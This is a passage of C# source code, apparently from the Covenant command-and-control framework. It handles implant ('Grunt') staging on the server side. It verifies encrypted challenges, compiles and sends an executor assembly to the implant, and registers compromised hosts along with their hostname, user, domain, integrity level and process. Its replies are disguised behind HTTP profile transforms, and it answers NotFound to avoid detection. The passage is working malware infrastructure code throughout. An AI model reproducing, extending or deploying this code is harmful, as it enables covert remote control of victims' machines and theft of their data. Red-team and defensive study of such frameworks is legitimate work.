            // Format transformed response
            string response = String.Format(_context.HttpProfile.First().HttpPostResponse, transformed);
            // Stage1Response: "Base64(IV),Base64(AES(challenge1 + challenge2)),Base64(HMAC)"
            return Ok(response);
        }

        public async Task<ActionResult> PostStage2(Grunt egressGrunt, Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage gruntStage2Response)
        {
            if (targetGrunt == null || targetGrunt.Status != GruntStatus.Stage1 || !gruntStage2Response.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
            {
				// Always return NotFound, don't give away unnecessary info
                return NotFound();
            }
            if (egressGrunt == null)
            {
                egressGrunt = targetGrunt;
            }
            byte[] challenge2test = _utilities.GruntSessionDecrypt(targetGrunt, gruntStage2Response);
            if (targetGrunt.GruntChallenge != Convert.ToBase64String(challenge2test))
            {
                // Always return NotFound, don't give away unnecessary info
                return NotFound();
            }
            targetGrunt.Status = GruntStatus.Stage2;
            targetGrunt.LastCheckIn = DateTime.UtcNow;
            await _client.ApiGruntsPutAsync(targetGrunt);
            string GruntExecutorAssembly = this._utilities.ListenerCompileGruntExecutorCode(_context.HttpListener.First(), targetGrunt, _context.HttpProfile.First());

            ModelUtilities.GruntEncryptedMessage message;
            try
            {
                message = this.CreateMessageForGrunt(egressGrunt, targetGrunt, Convert.FromBase64String(GruntExecutorAssembly));
            }
            catch (HttpOperationException)
            {
                return NotFound();
            }

            // Transform response
            string transformed = this._utilities.ProfileTransform(_context.HttpProfile.First(), Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
            // Format transformed response
            string response = String.Format(_context.HttpProfile.First().HttpPostResponse, transformed);
            // returns: "Base64(IV),Base64(AES(GruntExecutorAssembly)),Base64(HMAC)"
            return Ok(response);
        }

		private async Task<ActionResult> RegisterGrunt(Grunt egressGrunt, Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage gruntMessage)
		{
            if (targetGrunt == null || targetGrunt.Status != GruntStatus.Stage2 || !gruntMessage.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
			{
				// Always return NotFound, don't give away unnecessary info
				return NotFound();
			}
            if (egressGrunt == null)
            {
                egressGrunt = targetGrunt;
            }
			string message = Common.CovenantEncoding.GetString(_utilities.GruntSessionDecrypt(targetGrunt, gruntMessage));
			// todo: try/catch on deserialize?
			Grunt grunt = JsonConvert.DeserializeObject<Grunt>(message);

			targetGrunt.IpAddress = grunt.IpAddress;
            targetGrunt.Hostname = grunt.Hostname;
			targetGrunt.OperatingSystem = grunt.OperatingSystem;
			targetGrunt.UserDomainName = grunt.UserDomainName;
			targetGrunt.UserName = grunt.UserName;
			targetGrunt.Status = GruntStatus.Active;
            targetGrunt.Integrity = grunt.Integrity;
			targetGrunt.Process = grunt.Process;
            targetGrunt.LastCheckIn = DateTime.UtcNow;

            await _client.ApiGruntsPutAsync(targetGrunt);

            GruntTaskingMessage tasking = new GruntTaskingMessage
            {
                Message = targetGrunt.Guid,
                Name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
                Type = GruntTaskingType.Jobs,
                Token = false
            };

            ModelUtilities.GruntEncryptedMessage responseMessage;
            try
            {
                responseMessage = this.CreateMessageForGrunt(egressGrunt, targetGrunt, tasking);
            }
            catch (HttpOperationException)
            {
                return NotFound();
            }

            // Transform response
            string transformed = this._utilities.ProfileTransform(_context.HttpProfile.First(), Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(responseMessage)));
            // Format transformed response
            string response = String.Format(_context.HttpProfile.First().HttpPostResponse, transformed);
            return Ok(response);
        }
    }
}
